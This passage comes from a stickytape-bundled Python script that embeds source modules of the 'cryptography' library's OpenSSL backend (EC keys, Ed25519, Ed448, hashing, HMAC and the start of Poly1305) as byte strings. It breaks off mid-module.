backend._lib.EC_GROUP_get_curve_name(group)\r\n    # The following check is to find EC keys with unnamed curves and raise\r\n    # an error for now.\r\n    if nid == backend._lib.NID_undef:\r\n        raise ValueError(\r\n            "ECDSA keys with explicit parameters are unsupported at this time"\r\n        )\r\n\r\n    # This is like the above check, but it also catches the case where you\r\n    # explicitly encoded a curve with the same parameters as a named curve.\r\n    # Don\'t do that.\r\n    if (\r\n        not backend._lib.CRYPTOGRAPHY_IS_LIBRESSL\r\n        and backend._lib.EC_GROUP_get_asn1_flag(group) == 0\r\n    ):\r\n        raise ValueError(\r\n            "ECDSA keys with explicit parameters are unsupported at this time"\r\n        )\r\n\r\n    curve_name = backend._lib.OBJ_nid2sn(nid)\r\n    backend.openssl_assert(curve_name != backend._ffi.NULL)\r\n\r\n    sn = backend._ffi.string(curve_name).decode("ascii")\r\n    return sn\r\n\r\n\r\ndef _mark_asn1_named_ec_curve(backend: "Backend", ec_cdata):\r\n    """\r\n    Set the named curve flag on the EC_KEY. This causes OpenSSL to\r\n    serialize EC keys along with their curve OID which makes\r\n    deserialization easier.\r\n    """\r\n\r\n    backend._lib.EC_KEY_set_asn1_flag(\r\n        ec_cdata, backend._lib.OPENSSL_EC_NAMED_CURVE\r\n    )\r\n\r\n\r\ndef _check_key_infinity(backend: "Backend", ec_cdata) -> None:\r\n    point = backend._lib.EC_KEY_get0_public_key(ec_cdata)\r\n    backend.openssl_assert(point != backend._ffi.NULL)\r\n    group = backend._lib.EC_KEY_get0_group(ec_cdata)\r\n    backend.openssl_assert(group != backend._ffi.NULL)\r\n    if backend._lib.EC_POINT_is_at_infinity(group, point):\r\n        raise ValueError(\r\n            "Cannot load an EC public key where the point is at infinity"\r\n        )\r\n\r\n\r\ndef _sn_to_elliptic_curve(backend: "Backend", sn: str) -> ec.EllipticCurve:\r\n    try:\r\n        return ec._CURVE_TYPES[sn]()\r\n    except KeyError:\r\n        raise UnsupportedAlgorithm(\r\n            "{} is not a supported elliptic curve".format(sn),\r\n            _Reasons.UNSUPPORTED_ELLIPTIC_CURVE,\r\n        )\r\n\r\n\r\ndef _ecdsa_sig_sign(\r\n    backend: "Backend", private_key: "_EllipticCurvePrivateKey", data: bytes\r\n) -> bytes:\r\n    max_size = backend._lib.ECDSA_size(private_key._ec_key)\r\n    backend.openssl_assert(max_size > 0)\r\n\r\n    sigbuf = backend._ffi.new("unsigned char[]", max_size)\r\n    siglen_ptr = backend._ffi.new("unsigned int[]", 1)\r\n    res = backend._lib.ECDSA_sign(\r\n        0, data, len(data), sigbuf, siglen_ptr, private_key._ec_key\r\n    )\r\n    backend.openssl_assert(res == 1)\r\n    return backend._ffi.buffer(sigbuf)[: siglen_ptr[0]]\r\n\r\n\r\ndef _ecdsa_sig_verify(\r\n    backend: "Backend",\r\n    public_key: "_EllipticCurvePublicKey",\r\n    signature: bytes,\r\n    data: bytes,\r\n) -> None:\r\n    res = backend._lib.ECDSA_verify(\r\n        0, data, len(data), signature, len(signature), public_key._ec_key\r\n    )\r\n    if res != 1:\r\n        backend._consume_errors()\r\n        raise InvalidSignature\r\n\r\n\r\nclass _EllipticCurvePrivateKey(ec.EllipticCurvePrivateKey):\r\n    def __init__(self, backend: "Backend", ec_key_cdata, evp_pkey):\r\n        self._backend = backend\r\n        self._ec_key = ec_key_cdata\r\n        self._evp_pkey = evp_pkey\r\n\r\n        sn = _ec_key_curve_sn(backend, ec_key_cdata)\r\n        self._curve = _sn_to_elliptic_curve(backend, sn)\r\n        _mark_asn1_named_ec_curve(backend, ec_key_cdata)\r\n        _check_key_infinity(backend, ec_key_cdata)\r\n\r\n    @property\r\n    def curve(self) -> ec.EllipticCurve:\r\n        return self._curve\r\n\r\n    @property\r\n    def key_size(self) -> int:\r\n        return self.curve.key_size\r\n\r\n    def exchange(\r\n        self, algorithm: ec.ECDH, peer_public_key: ec.EllipticCurvePublicKey\r\n    ) -> bytes:\r\n        if not (\r\n            self._backend.elliptic_curve_exchange_algorithm_supported(\r\n                algorithm, self.curve\r\n            )\r\n        ):\r\n            raise UnsupportedAlgorithm(\r\n                "This backend does not support the ECDH algorithm.",\r\n                _Reasons.UNSUPPORTED_EXCHANGE_ALGORITHM,\r\n            )\r\n\r\n        if peer_public_key.curve.name != self.curve.name:\r\n            raise ValueError(\r\n                "peer_public_key and self are not on the same curve"\r\n            )\r\n\r\n        return _evp_pkey_derive(self._backend, self._evp_pkey, peer_public_key)\r\n\r\n    def public_key(self) -> ec.EllipticCurvePublicKey:\r\n        group = self._backend._lib.EC_KEY_get0_group(self._ec_key)\r\n        self._backend.openssl_assert(group != self._backend._ffi.NULL)\r\n\r\n        curve_nid = self._backend._lib.EC_GROUP_get_curve_name(group)\r\n        public_ec_key = self._backend._ec_key_new_by_curve_nid(curve_nid)\r\n\r\n        point = self._backend._lib.EC_KEY_get0_public_key(self._ec_key)\r\n        self._backend.openssl_assert(point != self._backend._ffi.NULL)\r\n\r\n        res = self._backend._lib.EC_KEY_set_public_key(public_ec_key, point)\r\n        self._backend.openssl_assert(res == 1)\r\n\r\n        evp_pkey = self._backend._ec_cdata_to_evp_pkey(public_ec_key)\r\n\r\n        return _EllipticCurvePublicKey(self._backend, public_ec_key, evp_pkey)\r\n\r\n    def private_numbers(self) -> ec.EllipticCurvePrivateNumbers:\r\n        bn = self._backend._lib.EC_KEY_get0_private_key(self._ec_key)\r\n        private_value = self._backend._bn_to_int(bn)\r\n        return ec.EllipticCurvePrivateNumbers(\r\n            private_value=private_value,\r\n            public_numbers=self.public_key().public_numbers(),\r\n        )\r\n\r\n    def private_bytes(\r\n        self,\r\n        encoding: serialization.Encoding,\r\n        format: serialization.PrivateFormat,\r\n        encryption_algorithm: serialization.KeySerializationEncryption,\r\n    ) -> bytes:\r\n        return self._backend._private_key_bytes(\r\n            encoding,\r\n            format,\r\n            encryption_algorithm,\r\n            self,\r\n            self._evp_pkey,\r\n            self._ec_key,\r\n        )\r\n\r\n    def sign(\r\n        self,\r\n        data: bytes,\r\n        signature_algorithm: ec.EllipticCurveSignatureAlgorithm,\r\n    ) -> bytes:\r\n        _check_signature_algorithm(signature_algorithm)\r\n        data, _ = _calculate_digest_and_algorithm(\r\n            data,\r\n            signature_algorithm.algorithm,\r\n        )\r\n        return _ecdsa_sig_sign(self._backend, self, data)\r\n\r\n\r\nclass _EllipticCurvePublicKey(ec.EllipticCurvePublicKey):\r\n    def __init__(self, backend: "Backend", ec_key_cdata, evp_pkey):\r\n        self._backend = backend\r\n        self._ec_key = ec_key_cdata\r\n        self._evp_pkey = evp_pkey\r\n\r\n        sn = _ec_key_curve_sn(backend, ec_key_cdata)\r\n        self._curve = _sn_to_elliptic_curve(backend, sn)\r\n        _mark_asn1_named_ec_curve(backend, ec_key_cdata)\r\n        _check_key_infinity(backend, ec_key_cdata)\r\n\r\n    @property\r\n    def curve(self) -> ec.EllipticCurve:\r\n        return self._curve\r\n\r\n    @property\r\n    def key_size(self) -> int:\r\n        return self.curve.key_size\r\n\r\n    def public_numbers(self) -> ec.EllipticCurvePublicNumbers:\r\n        get_func, group = self._backend._ec_key_determine_group_get_func(\r\n            self._ec_key\r\n        )\r\n        point = self._backend._lib.EC_KEY_get0_public_key(self._ec_key)\r\n        self._backend.openssl_assert(point != self._backend._ffi.NULL)\r\n\r\n        with self._backend._tmp_bn_ctx() as bn_ctx:\r\n            bn_x = self._backend._lib.BN_CTX_get(bn_ctx)\r\n            bn_y = self._backend._lib.BN_CTX_get(bn_ctx)\r\n\r\n            res = get_func(group, point, bn_x, bn_y, bn_ctx)\r\n            self._backend.openssl_assert(res == 1)\r\n\r\n            x = self._backend._bn_to_int(bn_x)\r\n            y = self._backend._bn_to_int(bn_y)\r\n\r\n        return ec.EllipticCurvePublicNumbers(x=x, y=y, curve=self._curve)\r\n\r\n    def _encode_point(self, format: serialization.PublicFormat) -> bytes:\r\n        if format is serialization.PublicFormat.CompressedPoint:\r\n            conversion = self._backend._lib.POINT_CONVERSION_COMPRESSED\r\n        else:\r\n            assert format is serialization.PublicFormat.UncompressedPoint\r\n            conversion = self._backend._lib.POINT_CONVERSION_UNCOMPRESSED\r\n\r\n        group = self._backend._lib.EC_KEY_get0_group(self._ec_key)\r\n        self._backend.openssl_assert(group != self._backend._ffi.NULL)\r\n        point = self._backend._lib.EC_KEY_get0_public_key(self._ec_key)\r\n        self._backend.openssl_assert(point != self._backend._ffi.NULL)\r\n        with self._backend._tmp_bn_ctx() as bn_ctx:\r\n            buflen = self._backend._lib.EC_POINT_point2oct(\r\n                group, point, conversion, self._backend._ffi.NULL, 0, bn_ctx\r\n            )\r\n            self._backend.openssl_assert(buflen > 0)\r\n            buf = self._backend._ffi.new("char[]", buflen)\r\n            res = self._backend._lib.EC_POINT_point2oct(\r\n                group, point, conversion, buf, buflen, bn_ctx\r\n            )\r\n            self._backend.openssl_assert(buflen == res)\r\n\r\n        return self._backend._ffi.buffer(buf)[:]\r\n\r\n    def public_bytes(\r\n        self,\r\n        encoding: serialization.Encoding,\r\n        format: serialization.PublicFormat,\r\n    ) -> bytes:\r\n        if (\r\n            encoding is serialization.Encoding.X962\r\n            or format is serialization.PublicFormat.CompressedPoint\r\n            or format is serialization.PublicFormat.UncompressedPoint\r\n        ):\r\n            if encoding is not serialization.Encoding.X962 or format not in (\r\n                serialization.PublicFormat.CompressedPoint,\r\n                serialization.PublicFormat.UncompressedPoint,\r\n            ):\r\n                raise ValueError(\r\n                    "X962 encoding must be used with CompressedPoint or "\r\n                    "UncompressedPoint format"\r\n                )\r\n\r\n            return self._encode_point(format)\r\n        else:\r\n            return self._backend._public_key_bytes(\r\n                encoding, format, self, self._evp_pkey, None\r\n            )\r\n\r\n    def verify(\r\n        self,\r\n        signature: bytes,\r\n        data: bytes,\r\n        signature_algorithm: ec.EllipticCurveSignatureAlgorithm,\r\n    ) -> None:\r\n        _check_signature_algorithm(signature_algorithm)\r\n        data, _ = _calculate_digest_and_algorithm(\r\n            data,\r\n            signature_algorithm.algorithm,\r\n        )\r\n        _ecdsa_sig_verify(self._backend, self, signature, data)\r\n')
    __stickytape_write_module('cryptography/hazmat/backends/openssl/ed25519.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\nimport typing\r\n\r\nfrom cryptography import exceptions\r\nfrom cryptography.hazmat.primitives import serialization\r\nfrom cryptography.hazmat.primitives.asymmetric.ed25519 import (\r\n    Ed25519PrivateKey,\r\n    Ed25519PublicKey,\r\n    _ED25519_KEY_SIZE,\r\n    _ED25519_SIG_SIZE,\r\n)\r\n\r\nif typing.TYPE_CHECKING:\r\n    from cryptography.hazmat.backends.openssl.backend import Backend\r\n\r\n\r\nclass _Ed25519PublicKey(Ed25519PublicKey):\r\n    def __init__(self, backend: "Backend", evp_pkey):\r\n        self._backend = backend\r\n        self._evp_pkey = evp_pkey\r\n\r\n    def public_bytes(\r\n        self,\r\n        encoding: serialization.Encoding,\r\n        format: serialization.PublicFormat,\r\n    ) -> bytes:\r\n        if (\r\n            encoding is serialization.Encoding.Raw\r\n            or format is serialization.PublicFormat.Raw\r\n        ):\r\n            if (\r\n                encoding is not serialization.Encoding.Raw\r\n                or format is not serialization.PublicFormat.Raw\r\n            ):\r\n                raise ValueError(\r\n                    "When using Raw both encoding and format must be Raw"\r\n                )\r\n\r\n            return self._raw_public_bytes()\r\n\r\n        return self._backend._public_key_bytes(\r\n            encoding, format, self, self._evp_pkey, None\r\n        )\r\n\r\n    def _raw_public_bytes(self) -> bytes:\r\n        buf = self._backend._ffi.new("unsigned char []", _ED25519_KEY_SIZE)\r\n        buflen = self._backend._ffi.new("size_t *", _ED25519_KEY_SIZE)\r\n        res = self._backend._lib.EVP_PKEY_get_raw_public_key(\r\n            self._evp_pkey, buf, buflen\r\n        )\r\n        self._backend.openssl_assert(res == 1)\r\n        self._backend.openssl_assert(buflen[0] == _ED25519_KEY_SIZE)\r\n        return self._backend._ffi.buffer(buf, _ED25519_KEY_SIZE)[:]\r\n\r\n    def verify(self, signature: bytes, data: bytes) -> None:\r\n        evp_md_ctx = self._backend._lib.EVP_MD_CTX_new()\r\n        self._backend.openssl_assert(evp_md_ctx != self._backend._ffi.NULL)\r\n        evp_md_ctx = self._backend._ffi.gc(\r\n            evp_md_ctx, self._backend._lib.EVP_MD_CTX_free\r\n        )\r\n        res = self._backend._lib.EVP_DigestVerifyInit(\r\n            evp_md_ctx,\r\n            self._backend._ffi.NULL,\r\n            self._backend._ffi.NULL,\r\n            self._backend._ffi.NULL,\r\n            self._evp_pkey,\r\n        )\r\n        self._backend.openssl_assert(res == 1)\r\n        res = self._backend._lib.EVP_DigestVerify(\r\n            evp_md_ctx, signature, len(signature), data, len(data)\r\n        )\r\n        if res != 1:\r\n            self._backend._consume_errors()\r\n            raise exceptions.InvalidSignature\r\n\r\n\r\nclass _Ed25519PrivateKey(Ed25519PrivateKey):\r\n    def __init__(self, backend: "Backend", evp_pkey):\r\n        self._backend = backend\r\n        self._evp_pkey = evp_pkey\r\n\r\n    def public_key(self) -> Ed25519PublicKey:\r\n        buf = self._backend._ffi.new("unsigned char []", _ED25519_KEY_SIZE)\r\n        buflen = self._backend._ffi.new("size_t *", _ED25519_KEY_SIZE)\r\n        res = self._backend._lib.EVP_PKEY_get_raw_public_key(\r\n            self._evp_pkey, buf, buflen\r\n        )\r\n        self._backend.openssl_assert(res == 1)\r\n        self._backend.openssl_assert(buflen[0] == _ED25519_KEY_SIZE)\r\n        public_bytes = self._backend._ffi.buffer(buf)[:]\r\n        return self._backend.ed25519_load_public_bytes(public_bytes)\r\n\r\n    def sign(self, data: bytes) -> bytes:\r\n        evp_md_ctx = self._backend._lib.EVP_MD_CTX_new()\r\n        self._backend.openssl_assert(evp_md_ctx != self._backend._ffi.NULL)\r\n        evp_md_ctx = self._backend._ffi.gc(\r\n            evp_md_ctx, self._backend._lib.EVP_MD_CTX_free\r\n        )\r\n        res = self._backend._lib.EVP_DigestSignInit(\r\n            evp_md_ctx,\r\n            self._backend._ffi.NULL,\r\n            self._backend._ffi.NULL,\r\n            self._backend._ffi.NULL,\r\n            self._evp_pkey,\r\n        )\r\n        self._backend.openssl_assert(res == 1)\r\n        buf = self._backend._ffi.new("unsigned char[]", _ED25519_SIG_SIZE)\r\n        buflen = self._backend._ffi.new("size_t *", len(buf))\r\n        res = self._backend._lib.EVP_DigestSign(\r\n            evp_md_ctx, buf, buflen, data, len(data)\r\n        )\r\n        self._backend.openssl_assert(res == 1)\r\n        self._backend.openssl_assert(buflen[0] == _ED25519_SIG_SIZE)\r\n        return self._backend._ffi.buffer(buf, buflen[0])[:]\r\n\r\n    def private_bytes(\r\n        self,\r\n        encoding: serialization.Encoding,\r\n        format: serialization.PrivateFormat,\r\n        encryption_algorithm: serialization.KeySerializationEncryption,\r\n    ) -> bytes:\r\n        if (\r\n            encoding is serialization.Encoding.Raw\r\n            or format is serialization.PublicFormat.Raw\r\n        ):\r\n            if (\r\n                format is not serialization.PrivateFormat.Raw\r\n                or encoding is not serialization.Encoding.Raw\r\n                or not isinstance(\r\n                    encryption_algorithm, serialization.NoEncryption\r\n                )\r\n            ):\r\n                raise ValueError(\r\n                    "When using Raw both encoding and format must be Raw "\r\n                    "and encryption_algorithm must be NoEncryption()"\r\n                )\r\n\r\n            return self._raw_private_bytes()\r\n\r\n        return self._backend._private_key_bytes(\r\n            encoding, format, encryption_algorithm, self, self._evp_pkey, None\r\n        )\r\n\r\n    def _raw_private_bytes(self) -> bytes:\r\n        buf = self._backend._ffi.new("unsigned char []", _ED25519_KEY_SIZE)\r\n        buflen = self._backend._ffi.new("size_t *", _ED25519_KEY_SIZE)\r\n        res = self._backend._lib.EVP_PKEY_get_raw_private_key(\r\n            self._evp_pkey, buf, buflen\r\n        )\r\n        self._backend.openssl_assert(res == 1)\r\n        self._backend.openssl_assert(buflen[0] == _ED25519_KEY_SIZE)\r\n        return self._backend._ffi.buffer(buf, _ED25519_KEY_SIZE)[:]\r\n')
    __stickytape_write_module('cryptography/hazmat/backends/openssl/ed448.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\nimport typing\r\n\r\nfrom cryptography import exceptions\r\nfrom cryptography.hazmat.primitives import serialization\r\nfrom cryptography.hazmat.primitives.asymmetric.ed448 import (\r\n    Ed448PrivateKey,\r\n    Ed448PublicKey,\r\n)\r\n\r\nif typing.TYPE_CHECKING:\r\n    from cryptography.hazmat.backends.openssl.backend import Backend\r\n\r\n_ED448_KEY_SIZE = 57\r\n_ED448_SIG_SIZE = 114\r\n\r\n\r\nclass _Ed448PublicKey(Ed448PublicKey):\r\n    def __init__(self, backend: "Backend", evp_pkey):\r\n        self._backend = backend\r\n        self._evp_pkey = evp_pkey\r\n\r\n    def public_bytes(\r\n        self,\r\n        encoding: serialization.Encoding,\r\n        format: serialization.PublicFormat,\r\n    ) -> bytes:\r\n        if (\r\n            encoding is serialization.Encoding.Raw\r\n            or format is serialization.PublicFormat.Raw\r\n        ):\r\n            if (\r\n                encoding is not serialization.Encoding.Raw\r\n                or format is not serialization.PublicFormat.Raw\r\n            ):\r\n                raise ValueError(\r\n                    "When using Raw both encoding and format must be Raw"\r\n                )\r\n\r\n            return self._raw_public_bytes()\r\n\r\n        return self._backend._public_key_bytes(\r\n            encoding, format, self, self._evp_pkey, None\r\n        )\r\n\r\n    def _raw_public_bytes(self) -> bytes:\r\n        buf = self._backend._ffi.new("unsigned char []", _ED448_KEY_SIZE)\r\n        buflen = self._backend._ffi.new("size_t *", _ED448_KEY_SIZE)\r\n        res = self._backend._lib.EVP_PKEY_get_raw_public_key(\r\n            self._evp_pkey, buf, buflen\r\n        )\r\n        self._backend.openssl_assert(res == 1)\r\n        self._backend.openssl_assert(buflen[0] == _ED448_KEY_SIZE)\r\n        return self._backend._ffi.buffer(buf, _ED448_KEY_SIZE)[:]\r\n\r\n    def verify(self, signature: bytes, data: bytes) -> None:\r\n        evp_md_ctx = self._backend._lib.EVP_MD_CTX_new()\r\n        self._backend.openssl_assert(evp_md_ctx != self._backend._ffi.NULL)\r\n        evp_md_ctx = self._backend._ffi.gc(\r\n            evp_md_ctx, self._backend._lib.EVP_MD_CTX_free\r\n        )\r\n        res = self._backend._lib.EVP_DigestVerifyInit(\r\n            evp_md_ctx,\r\n            self._backend._ffi.NULL,\r\n            self._backend._ffi.NULL,\r\n            self._backend._ffi.NULL,\r\n            self._evp_pkey,\r\n        )\r\n        self._backend.openssl_assert(res == 1)\r\n        res = self._backend._lib.EVP_DigestVerify(\r\n            evp_md_ctx, signature, len(signature), data, len(data)\r\n        )\r\n        if res != 1:\r\n            self._backend._consume_errors()\r\n            raise exceptions.InvalidSignature\r\n\r\n\r\nclass _Ed448PrivateKey(Ed448PrivateKey):\r\n    def __init__(self, backend: "Backend", evp_pkey):\r\n        self._backend = backend\r\n        self._evp_pkey = evp_pkey\r\n\r\n    def public_key(self) -> Ed448PublicKey:\r\n        buf = self._backend._ffi.new("unsigned char []", _ED448_KEY_SIZE)\r\n        buflen = self._backend._ffi.new("size_t *", _ED448_KEY_SIZE)\r\n        res = self._backend._lib.EVP_PKEY_get_raw_public_key(\r\n            self._evp_pkey, buf, buflen\r\n        )\r\n        self._backend.openssl_assert(res == 1)\r\n        self._backend.openssl_assert(buflen[0] == _ED448_KEY_SIZE)\r\n        public_bytes = self._backend._ffi.buffer(buf)[:]\r\n        return self._backend.ed448_load_public_bytes(public_bytes)\r\n\r\n    def sign(self, data: bytes) -> bytes:\r\n        evp_md_ctx = self._backend._lib.EVP_MD_CTX_new()\r\n        self._backend.openssl_assert(evp_md_ctx != self._backend._ffi.NULL)\r\n        evp_md_ctx = self._backend._ffi.gc(\r\n            evp_md_ctx, self._backend._lib.EVP_MD_CTX_free\r\n        )\r\n        res = self._backend._lib.EVP_DigestSignInit(\r\n            evp_md_ctx,\r\n            self._backend._ffi.NULL,\r\n            self._backend._ffi.NULL,\r\n            self._backend._ffi.NULL,\r\n            self._evp_pkey,\r\n        )\r\n        self._backend.openssl_assert(res == 1)\r\n        buf = self._backend._ffi.new("unsigned char[]", _ED448_SIG_SIZE)\r\n        buflen = self._backend._ffi.new("size_t *", len(buf))\r\n        res = self._backend._lib.EVP_DigestSign(\r\n            evp_md_ctx, buf, buflen, data, len(data)\r\n        )\r\n        self._backend.openssl_assert(res == 1)\r\n        self._backend.openssl_assert(buflen[0] == _ED448_SIG_SIZE)\r\n        return self._backend._ffi.buffer(buf, buflen[0])[:]\r\n\r\n    def private_bytes(\r\n        self,\r\n        encoding: serialization.Encoding,\r\n        format: serialization.PrivateFormat,\r\n        encryption_algorithm: serialization.KeySerializationEncryption,\r\n    ) -> bytes:\r\n        if (\r\n            encoding is serialization.Encoding.Raw\r\n            or format is serialization.PublicFormat.Raw\r\n        ):\r\n            if (\r\n                format is not serialization.PrivateFormat.Raw\r\n                or encoding is not serialization.Encoding.Raw\r\n                or not isinstance(\r\n                    encryption_algorithm, serialization.NoEncryption\r\n                )\r\n            ):\r\n                raise ValueError(\r\n                    "When using Raw both encoding and format must be Raw "\r\n                    "and encryption_algorithm must be NoEncryption()"\r\n                )\r\n\r\n            return self._raw_private_bytes()\r\n\r\n        return self._backend._private_key_bytes(\r\n            encoding, format, encryption_algorithm, self, self._evp_pkey, None\r\n        )\r\n\r\n    def _raw_private_bytes(self) -> bytes:\r\n        buf = self._backend._ffi.new("unsigned char []", _ED448_KEY_SIZE)\r\n        buflen = self._backend._ffi.new("size_t *", _ED448_KEY_SIZE)\r\n        res = self._backend._lib.EVP_PKEY_get_raw_private_key(\r\n            self._evp_pkey, buf, buflen\r\n        )\r\n        self._backend.openssl_assert(res == 1)\r\n        self._backend.openssl_assert(buflen[0] == _ED448_KEY_SIZE)\r\n        return self._backend._ffi.buffer(buf, _ED448_KEY_SIZE)[:]\r\n')
    __stickytape_write_module('cryptography/hazmat/backends/openssl/hashes.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\nimport typing\r\n\r\nfrom cryptography.exceptions import UnsupportedAlgorithm, _Reasons\r\nfrom cryptography.hazmat.primitives import hashes\r\n\r\n\r\nif typing.TYPE_CHECKING:\r\n    from cryptography.hazmat.backends.openssl.backend import Backend\r\n\r\n\r\nclass _HashContext(hashes.HashContext):\r\n    def __init__(\r\n        self, backend: "Backend", algorithm: hashes.HashAlgorithm, ctx=None\r\n    ) -> None:\r\n        self._algorithm = algorithm\r\n\r\n        self._backend = backend\r\n\r\n        if ctx is None:\r\n            ctx = self._backend._lib.EVP_MD_CTX_new()\r\n            ctx = self._backend._ffi.gc(\r\n                ctx, self._backend._lib.EVP_MD_CTX_free\r\n            )\r\n            evp_md = self._backend._evp_md_from_algorithm(algorithm)\r\n            if evp_md == self._backend._ffi.NULL:\r\n                raise UnsupportedAlgorithm(\r\n                    "{} is not a supported hash on this backend.".format(\r\n                        algorithm.name\r\n                    ),\r\n                    _Reasons.UNSUPPORTED_HASH,\r\n                )\r\n            res = self._backend._lib.EVP_DigestInit_ex(\r\n                ctx, evp_md, self._backend._ffi.NULL\r\n            )\r\n            self._backend.openssl_assert(res != 0)\r\n\r\n        self._ctx = ctx\r\n\r\n    @property\r\n    def algorithm(self) -> hashes.HashAlgorithm:\r\n        return self._algorithm\r\n\r\n    def copy(self) -> "_HashContext":\r\n        copied_ctx = self._backend._lib.EVP_MD_CTX_new()\r\n        copied_ctx = self._backend._ffi.gc(\r\n            copied_ctx, self._backend._lib.EVP_MD_CTX_free\r\n        )\r\n        res = self._backend._lib.EVP_MD_CTX_copy_ex(copied_ctx, self._ctx)\r\n        self._backend.openssl_assert(res != 0)\r\n        return _HashContext(self._backend, self.algorithm, ctx=copied_ctx)\r\n\r\n    def update(self, data: bytes) -> None:\r\n        data_ptr = self._backend._ffi.from_buffer(data)\r\n        res = self._backend._lib.EVP_DigestUpdate(\r\n            self._ctx, data_ptr, len(data)\r\n        )\r\n        self._backend.openssl_assert(res != 0)\r\n\r\n    def finalize(self) -> bytes:\r\n        if isinstance(self.algorithm, hashes.ExtendableOutputFunction):\r\n            # extendable output functions use a different finalize\r\n            return self._finalize_xof()\r\n        else:\r\n            buf = self._backend._ffi.new(\r\n                "unsigned char[]", self._backend._lib.EVP_MAX_MD_SIZE\r\n            )\r\n            outlen = self._backend._ffi.new("unsigned int *")\r\n            res = self._backend._lib.EVP_DigestFinal_ex(self._ctx, buf, outlen)\r\n            self._backend.openssl_assert(res != 0)\r\n            self._backend.openssl_assert(\r\n                outlen[0] == self.algorithm.digest_size\r\n            )\r\n            return self._backend._ffi.buffer(buf)[: outlen[0]]\r\n\r\n    def _finalize_xof(self) -> bytes:\r\n        buf = self._backend._ffi.new(\r\n            "unsigned char[]", self.algorithm.digest_size\r\n        )\r\n        res = self._backend._lib.EVP_DigestFinalXOF(\r\n            self._ctx, buf, self.algorithm.digest_size\r\n        )\r\n        self._backend.openssl_assert(res != 0)\r\n        return self._backend._ffi.buffer(buf)[: self.algorithm.digest_size]\r\n')
    __stickytape_write_module('cryptography/hazmat/backends/openssl/hmac.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\nimport typing\r\n\r\nfrom cryptography.exceptions import (\r\n    InvalidSignature,\r\n    UnsupportedAlgorithm,\r\n    _Reasons,\r\n)\r\nfrom cryptography.hazmat.primitives import constant_time, hashes\r\n\r\n\r\nif typing.TYPE_CHECKING:\r\n    from cryptography.hazmat.backends.openssl.backend import Backend\r\n\r\n\r\nclass _HMACContext(hashes.HashContext):\r\n    def __init__(\r\n        self,\r\n        backend: "Backend",\r\n        key: bytes,\r\n        algorithm: hashes.HashAlgorithm,\r\n        ctx=None,\r\n    ):\r\n        self._algorithm = algorithm\r\n        self._backend = backend\r\n\r\n        if ctx is None:\r\n            ctx = self._backend._lib.HMAC_CTX_new()\r\n            self._backend.openssl_assert(ctx != self._backend._ffi.NULL)\r\n            ctx = self._backend._ffi.gc(ctx, self._backend._lib.HMAC_CTX_free)\r\n            evp_md = self._backend._evp_md_from_algorithm(algorithm)\r\n            if evp_md == self._backend._ffi.NULL:\r\n                raise UnsupportedAlgorithm(\r\n                    "{} is not a supported hash on this backend".format(\r\n                        algorithm.name\r\n                    ),\r\n                    _Reasons.UNSUPPORTED_HASH,\r\n                )\r\n            key_ptr = self._backend._ffi.from_buffer(key)\r\n            res = self._backend._lib.HMAC_Init_ex(\r\n                ctx, key_ptr, len(key), evp_md, self._backend._ffi.NULL\r\n            )\r\n            self._backend.openssl_assert(res != 0)\r\n\r\n        self._ctx = ctx\r\n        self._key = key\r\n\r\n    @property\r\n    def algorithm(self) -> hashes.HashAlgorithm:\r\n        return self._algorithm\r\n\r\n    def copy(self) -> "_HMACContext":\r\n        copied_ctx = self._backend._lib.HMAC_CTX_new()\r\n        self._backend.openssl_assert(copied_ctx != self._backend._ffi.NULL)\r\n        copied_ctx = self._backend._ffi.gc(\r\n            copied_ctx, self._backend._lib.HMAC_CTX_free\r\n        )\r\n        res = self._backend._lib.HMAC_CTX_copy(copied_ctx, self._ctx)\r\n        self._backend.openssl_assert(res != 0)\r\n        return _HMACContext(\r\n            self._backend, self._key, self.algorithm, ctx=copied_ctx\r\n        )\r\n\r\n    def update(self, data: bytes) -> None:\r\n        data_ptr = self._backend._ffi.from_buffer(data)\r\n        res = self._backend._lib.HMAC_Update(self._ctx, data_ptr, len(data))\r\n        self._backend.openssl_assert(res != 0)\r\n\r\n    def finalize(self) -> bytes:\r\n        buf = self._backend._ffi.new(\r\n            "unsigned char[]", self._backend._lib.EVP_MAX_MD_SIZE\r\n        )\r\n        outlen = self._backend._ffi.new("unsigned int *")\r\n        res = self._backend._lib.HMAC_Final(self._ctx, buf, outlen)\r\n        self._backend.openssl_assert(res != 0)\r\n        self._backend.openssl_assert(outlen[0] == self.algorithm.digest_size)\r\n        return self._backend._ffi.buffer(buf)[: outlen[0]]\r\n\r\n    def verify(self, signature: bytes) -> None:\r\n        digest = self.finalize()\r\n        if not constant_time.bytes_eq(digest, signature):\r\n            raise InvalidSignature("Signature did not match digest.")\r\n')
    __stickytape_write_module('cryptography/hazmat/backends/openssl/poly1305.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\nimport typing\r\n\r\nfrom cryptography.exceptions import InvalidSignature\r\nfrom cryptography.hazmat.primitives import constant_time\r\n\r\n\r\n_POLY1305_TAG_SIZE = 16\r\n_POLY1305_KEY_SIZE = 32\r\n\r\n\r\nif typing.TYPE_CHECKING:\r\n    from cryptography.hazmat.backends.openssl.backend import Backend\r\n\r\n\r\nclass _Poly1305Context:\r\n    def __init__(self, backend: "Backend", key: bytes) -> None:\r\n        self._backend = backend\r\n\r\n        key_ptr = self._backend._ffi.from_buffer(key)\r\n        # This function copies the key into OpenSSL-owned memory so we don\'t\r\n        # need to retain it ourselves\r\n        evp_pkey = self._backend._lib.EVP_PKEY_new_raw_private_key(\r\n            self._backend._lib.NID_poly1305,\r\n            self._backend._ffi.NULL,\r\n            key_ptr,\r\n            len(key),\r\n        )\r\n        self._backend.openssl_assert(evp_pkey != self._backend._ffi.NULL)\r\n        self._evp_pkey = self._backend._ffi.gc(\r\n            evp_pkey, self._backend._lib.EVP_PKEY_free\r\n        )\r\n        ctx = self._backend._lib.EVP_MD_CTX_new()\r\n        self._backend.openssl_assert(ctx != self._backend._ffi.NULL)\r\n        self._ctx = 